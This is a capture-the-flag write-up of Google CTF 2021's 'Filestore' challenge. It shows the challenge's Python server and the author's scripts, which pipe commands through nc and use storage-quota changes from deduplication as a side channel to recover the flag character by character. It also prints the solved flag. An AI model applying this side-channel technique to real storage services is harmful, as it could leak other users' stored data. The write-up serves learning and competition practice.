---
title: 💾 Google CTF 2021 - Filestore Challenge Writeup
author: Ashiq Amien
date: 2021-07-20 14:00:00 +0200
categories: [CTF, Misc]
tags: ctf
---


Filestore was a miscellaneous challenge from the [Google CTF](https://capturetheflag.withgoogle.com/). We are given the following Python file:

```python
import os, secrets, string, time
from flag import flag


def main():
    # It's a tiny server...
    blob = bytearray(2**16)
    files = {}
    used = 0

    # Use deduplication to save space.
    def store(data):
        nonlocal used
        MINIMUM_BLOCK = 16
        MAXIMUM_BLOCK = 1024
        part_list = []
        while data:
            prefix = data[:MINIMUM_BLOCK]
            ind = -1
            bestlen, bestind = 0, -1
            while True:
                ind = blob.find(prefix, ind+1)
                if ind == -1: break
                length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])]))
                if length > bestlen:
                    bestlen, bestind = length, ind

            if bestind != -1:
                part, data = data[:bestlen], data[bestlen:]
                part_list.append((bestind, bestlen))
            else:
                part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:]
                blob[used:used+len(part)] = part
                part_list.append((used, len(part)))
                used += len(part)
                assert used <= len(blob)

        fid = "".join(secrets.choice(string.ascii_letters+string.digits) for i in range(16))
        files[fid] = part_list
        return fid

    def load(fid):
        data = []
        for ind, length in files[fid]:
            data.append(blob[ind:ind+length])
        return b"".join(data)

    print("Welcome to our file storage solution.")

    # Store the flag as one of the files.
    store(bytes(flag, "utf-8"))

    while True:
        print()
        print("Menu:")
        print("- load")
        print("- store")
        print("- status")
        print("- exit")
        choice = input().strip().lower()
        if choice == "load":
            print("Send me the file id...")
            fid = input().strip()
            data = load(fid)
            print(data.decode())
        elif choice == "store":
            print("Send me a line of data...")
            data = input().strip()
            fid = store(bytes(data, "utf-8"))
            print("Stored! Here's your file id:")
            print(fid)
        elif choice == "status":
            print("User: ctfplayer")
            print("Time: %s" % time.asctime())
            kb = used / 1024.0
            kb_all = len(blob) / 1024.0
            print("Quota: %0.3fkB/%0.3fkB" % (kb, kb_all))
            print("Files: %d" % len(files))
        elif choice == "exit":
            break
        else:
            print("Nope.")
            break

try:
    main()
except Exception:
    print("Nope.")
time.sleep(1)
```

## Problem overview

Looking at the above script, we can see that we can store different chunks of data up to 64 kb. Given a file id, `fid`, we can reload the data. We can also check the status of server to see how much space was used and how many files are stored. 

The important thing to notice is to see how the data is stored and how we can save space, as noted with the comment `Use deduplication to save space`. This means that we check if the first 16 bytes of our data is already stored on the server, and then point to the longest matching prefix up to 1024 bytes. So, for example, if our server stores `[31337test42069]`, we can see that inserting the string `7test4` won't increase the usage of the server since we'll point to the beginning of the match and indicate that the length of the match is 6, from  `part_list.append((used, len(part)))`.

### Deducing the flag characters

We see that the flag is stored as the script is run on the server, leaving the server with usage `Quota: 0.026kB/64.000kB`. We know that the flag is of the form `CTF{__...__}`, meaning submitting the characters `C`, `T`, `F`, `{` or `}` won't adjust the usage of the server. We can follow the same pattern to figure out the other characters as well. For this I used the following script:

```python
print("status")
for s in string.ascii_letters+string.digits+"!@#$%^&*()_{}|~`/<>;:":
	print("store")
	print(s)	
	print("status")
print("status")
print("exit")
```

Running the script with `python script.py| nc <ctfserver> 1337 -i 1 | tee fileout.txt`, we can get the contents of the server output, including all of the different statuses between submitting different strings. To do this, check if the status does not change in between submissisons, and note the index to figure out which characters are inside the flag: 

```python
import string

s = string.ascii_letters+string.digits+"!@#$%^&*()_{}|~`/<>;:"

with open("fileout.txt","r") as fi:
    id = []
    for ln in fi:
        if ln.startswith("Quota:"):
            id.append(ln)

charlist = []
for i in range(len(id)-2):
	if id[i] == id[i+1]:
		charlist.append(s[i])
		print("found flag character: " + s[i])


print(charlist)
print(len(charlist))
```

This gives us the following set of flag characters: `['c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', 'X', '0', '1', '3', '4', '_', '{', '}']`. It looks right, since the letters `C`, `T`, `F`, `{` and `}`  show up. 

### Iterating the flag

Using our character list, we can start iterating the flag by seeing which character appended to `CTF{` does not increase the usage. 

```python
flaglist = ['C','T','F','{']

for i in range(16):
	os.system('python charloop.py ' + "".join(flaglist) +' | nc filestore.2021.ctfcompetition.com 1337 -i 1 | tee fileout'+str(i)+'.txt')
	with open("fileout"+str(i)+".txt","r") as fi:
	    id = []
	    for ln in fi:
		if ln.startswith("Quota:"):
		    print(ln)    	
	for i in range(len(id)-2):
		if id[i] == id[i+1]:
			flaglist.append(charlist[i+1])
			print("found flag character: " + charlist[i+1])
	print(flaglist)	
	print("".join(flaglist))
```


This iterates the first 16 characters of the flag, `CTF{CR1M3_0f_d3d`. After that, we continually match the flag since the prefix is only checked up to the first 16 chars, so any appended character to our half flag is picked up as valid. Since we know the flag ends with `}`, we can iterate backwards to find the rest of the flag.

```python
secondflaglist = ['}']

for i in range (10):
	os.system('python charloop2.py ' + "".join(secondflaglist) +' | nc filestore.2021.ctfcompetition.com 1337 -i 1 | tee secondblockfileout'+str(i)+'.txt')
	with open("secondblockfileout"+str(i)+".txt","r") as fi:
	    id = []
	    for ln in fi:
		if ln.startswith("Quota:"):
		    id.append(ln)
		    print(ln)    	
	for i in range(len(id)-2):
		if id[i] == id[i+1]:
			secondflaglist.insert(0,charlist[i])
			print("found flag character: " + charlist[i])
	print(secondflaglist)	
	print("".join(secondflaglist))
```

This gives us the remainder of the flag `up1ic4ti0n}`, and we can piece it together to submit the final flag :) 


Overall it was a tough CTF, this was the only challenge I could solve. My main takeaway is from the challenge is that I need to bump up my scripting skills, since the [actual solution](https://github.com/google/google-ctf/blob/master/2021/quals/misc-filestore/challenge/solver.py) is *much* cleaner than my solution. Big thanks to Google and the author of the challenge! :)


